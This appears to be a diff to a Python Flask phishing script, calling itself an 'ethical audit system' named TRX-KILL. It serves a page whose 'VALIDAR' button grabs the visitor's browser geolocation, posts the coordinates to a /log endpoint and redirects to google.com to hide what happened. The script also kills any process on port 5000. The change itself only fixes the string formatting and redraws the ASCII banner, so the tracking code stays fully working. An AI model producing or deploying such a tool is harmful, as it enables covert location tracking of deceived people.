@@ -1,18 +1,16 @@
 #!/usr/bin/env python3
 import os
 import sys
-import time
 import threading
 import subprocess
 from flask import Flask, request, render_template_string
 
-# Limpieza inicial
+# Limpieza inicial de procesos previos
 os.system('fuser -k 5000/tcp > /dev/null 2>&1')
 
 app = Flask(__name__)
 URL_EXITO = "https://www.google.com"
 
-# Diseño de Interfaz
 HTML_FINAL = """
 <!DOCTYPE html>
 <html><body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
@@ -22,16 +20,16 @@ HTML_FINAL = """
         <button onclick="enviar()" style="background:#0f0; border:none; padding:10px; cursor:pointer;">VALIDAR</button>
     </div>
     <script>
-        function enviar() {
-            navigator.geolocation.getCurrentPosition((p) => {
-                fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({lat:p.coords.latitude, lon:p.coords.longitude})})
-                .then(() => window.location.href = "%s");
-            });
-        }
+        function enviar() {{
+            navigator.geolocation.getCurrentPosition((p) => {{
+                fetch('/log', {{method:'POST', headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({{lat:p.coords.latitude, lon:p.coords.longitude}})}})
+                .then(() => window.location.href = "{url}");
+            }});
+        }}
     </script>
 </body></html>
-""" % URL_EXITO
+""".format(url=URL_EXITO)
 
 @app.route('/')
 def index(): return render_template_string(HTML_FINAL)
@@ -44,10 +42,15 @@ def log():
 
 def banner():
     os.system('clear')
-    print(f"\033[1;32m" + "█▀▀ █▀▀ █▄ █ █▀▀ █ █▀█ █ █    █▀█ █ █ █▀█ █   █ █")
-    print("█▀░ ██▄ █ ▀█ █▄▄ █ █▀▄ █ █▄▄ █▄▄ █▀▄ █▄█ █▀▄ █▄▄ █▄█")
-    print(f"{'='*50}\033[0m")
-    print(f"\033[1;36m >> BIENVENIDO AL SISTEMA DE AUDITORÍA ÉTICA v23.0\033[0m")
+    print(f"\033[1;32m")
+    print(" ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
+    print(" ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║")
+    print("    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║")
+    print("    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
+    print("    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗██║")
+    print("    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝")
+    print(f"{'='*55}\033[0m")
+    print(f"\033[1;36m >> BIENVENIDO AL SISTEMA DE AUDITORÍA ÉTICA TRX-KILL\033[0m")
     print(f"\033[1;36m >> CREADOR: TRX-LILL | AÑO: 2026\033[0m\n")
 
 def main():
